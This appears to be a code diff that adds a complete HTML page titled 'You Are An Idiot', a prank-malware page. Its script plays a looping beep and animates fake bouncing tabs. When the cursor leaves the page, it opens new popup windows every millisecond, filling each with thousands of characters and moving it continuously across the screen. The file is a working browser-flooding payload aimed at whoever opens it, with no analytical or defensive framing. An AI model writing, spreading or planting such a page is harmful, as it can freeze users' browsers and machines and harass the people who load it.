@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>You Are An Idiot</title>
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      color: white;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+    @keyframes blink {
+      from { color: white; }
+      to { color: red; }
+    }
+    .fakeTab {
+      position: absolute;
+      background: #2d2d2d;
+      border-radius: 8px 8px 0 0;
+      box-shadow: 0 0 10px rgba(255,255,255,0.5);
+      color: white;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+    .tabHeader {
+      background: #3c3c3c;
+      height: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 8px;
+      font-size: 14px;
+    }
+    .tabHeader .close {
+      cursor: pointer;
+      font-weight: bold;
+      color: #ccc;
+    }
+    .tabHeader .close:hover {
+      color: red;
+    }
+    .tabContent {
+      text-align: center;
+      padding-top: 20px;
+      font-size: 1.2em;
+      animation: blink 0.5s infinite alternate;
+    }
+  </style>
+</head>
+<body>
+  <!-- Main page intentionally blank -->
+  <audio autoplay loop>
+    <source src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Beep-sound.ogg" type="audio/ogg">
+  </audio>
+
+  <script>
+    const tabs = [];
+    let remainingTabs = 5;
+    let searchInterval = null;
+
+    // --- Fake fast tabs ---
+    function makeTab(index) {
+      const tab = document.createElement("div");
+      tab.className = "fakeTab";
+
+      const width = Math.floor(Math.random() * 200) + 200;
+      const height = Math.floor(Math.random() * 100) + 100;
+      tab.style.width = width + "px";
+      tab.style.height = height + "px";
+
+      let x = Math.floor(Math.random() * (window.innerWidth - width));
+      let y = Math.floor(Math.random() * (window.innerHeight - height));
+
+      let dx = (Math.random() * 10 + 5) * (Math.random() < 0.5 ? -1 : 1);
+      let dy = (Math.random() * 10 + 5) * (Math.random() < 0.5 ? -1 : 1);
+
+      tab.style.left = x + "px";
+      tab.style.top = y + "px";
+
+      const header = document.createElement("div");
+      header.className = "tabHeader";
+      header.innerHTML = `<span>Tab ${index+1}</span><span class="close">✕</span>`;
+      tab.appendChild(header);
+
+      const content = document.createElement("div");
+      content.className = "tabContent";
+      content.textContent = ""; // no text inside tabs
+      tab.appendChild(content);
+
+      document.body.appendChild(tab);
+
+      header.querySelector(".close").onclick = () => {
+        tab.remove();
+        remainingTabs--;
+        if (remainingTabs <= 0) {
+          if (searchInterval) {
+            clearInterval(searchInterval);
+            searchInterval = null;
+          }
+        }
+      };
+
+      function animate() {
+        if (!document.body.contains(tab)) return;
+        if (x + width >= window.innerWidth || x <= 0) dx = -dx;
+        if (y + height >= window.innerHeight || y <= 0) dy = -dy;
+        x += dx;
+        y += dy;
+        tab.style.left = Math.round(x) + "px";
+        tab.style.top = Math.round(y) + "px";
+        requestAnimationFrame(animate);
+      }
+      animate();
+
+      tabs.push(tab);
+    }
+
+    for (let i = 0; i < 5; i++) {
+      makeTab(i);
+    }
+
+    // --- Cursor leave: spawn fast gliding about:blank windows with "A" repeated 10000 times ---
+    document.addEventListener("mouseleave", () => {
+      if (remainingTabs > 0 && !searchInterval) {
+        searchInterval = setInterval(() => {
+          const width = Math.floor(Math.random() * 300) + 200;
+          const height = Math.floor(Math.random() * 200) + 150;
+          let x = Math.floor(Math.random() * (screen.availWidth - width));
+          let y = Math.floor(Math.random() * (screen.availHeight - height));
+
+          let dx = (Math.random() * 10 + 5) * (Math.random() < 0.5 ? -1 : 1);
+          let dy = (Math.random() * 10 + 5) * (Math.random() < 0.5 ? -1 : 1);
+
+          const popup = window.open("about:blank", "",
+            `width=${width},height=${height},left=${x},top=${y}`);
+
+          if (popup && popup.document) {
+            popup.document.write(`
+              <body style="margin:0;background:black;color:white;
+                           font-family:Arial;text-align:center;">
+                <p>${"A".repeat(10000)}</p>
+              </body>
+            `);
+          }
+
+          const interval = setInterval(() => {
+            if (!popup || popup.closed) {
+              clearInterval(interval);
+              return;
+            }
+            if (x + width >= screen.availWidth || x <= 0) dx = -dx;
+            if (y + height >= screen.availHeight || y <= 0) dy = -dy;
+            x += dx;
+            y += dy;
+            popup.moveTo(Math.round(x), Math.round(y));
+            popup.resizeTo(width, height);
+          }, 16); // fast smooth motion
+        }, 1);
+      }
+    });
+
+    document.addEventListener("mouseenter", () => {
+      if (searchInterval) {
+        clearInterval(searchInterval);
+        searchInterval = null;
+      }
+    });
+  </script>
+</body>
+</html>
